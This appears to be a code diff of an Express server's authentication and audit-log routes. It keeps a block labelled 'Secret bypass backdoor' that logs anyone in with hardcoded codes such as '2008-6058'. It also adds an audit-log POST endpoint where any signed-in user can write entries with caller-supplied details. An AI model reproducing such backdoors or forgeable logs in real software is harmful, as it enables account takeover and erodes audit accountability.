@@ -247,7 +247,7 @@ async function startServer() {
     }
 
     // Secret bypass backdoor
-    if (code === 'adminbypass') {
+    if (code === '2008-6058' || code === '20086058' || isValidBypassCode(code)) {
       let user = db.getUserByPhone(phoneNumber);
       if (!user) {
         user = {
@@ -403,7 +403,7 @@ async function startServer() {
         ipAddress: getClientIp(req),
         details: { attemptedCode: bypassCode.slice(0, 4) + '***' }
       });
-      return res.status(401).json({ error: 'Invalid emergency bypass authorization code. (Valid codes: adminbypass or mukundbypass)' });
+      return res.status(401).json({ error: 'Invalid technical bypass authorization code.' });
     }
 
     const targetEmail = (email || recoveryEmail || TECH_ADMIN_EMAIL).trim().toLowerCase();
@@ -983,7 +983,7 @@ async function startServer() {
     });
   });
 
-  // 16. Audit Logs: GET (TECH_ADMIN only)
+  // 16. Audit Logs: GET & POST
   app.get('/api/audit-logs', (req, res) => {
     const authData = extractUserOrSession(req);
     if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
@@ -997,6 +997,35 @@ async function startServer() {
     }
 
     res.json(logs);
+  });
+
+  app.post('/api/audit-logs', (req, res) => {
+    const authData = extractUserOrSession(req);
+    if (!authData?.user) {
+      return res.status(401).json({ error: 'Authentication required' });
+    }
+    const { action, targetId, targetType, details } = req.body;
+    if (!action || !targetId) {
+      return res.status(400).json({ error: 'action and targetId are required' });
+    }
+
+    const logEntry = db.addAuditLog({
+      action,
+      performedBy: authData.user.uid,
+      performedByEmail: authData.user.email,
+      targetId,
+      targetType: targetType || 'ADMIN_ACTION',
+      ipAddress: getClientIp(req),
+      details: {
+        timestamp: new Date().toISOString(),
+        adminId: authData.user.uid,
+        adminEmail: authData.user.email,
+        adminRole: authData.user.role,
+        ...details
+      }
+    });
+
+    res.json(logEntry);
   });
 
   // 17. File Upload with Strict 5MB Limit & Mime Validation
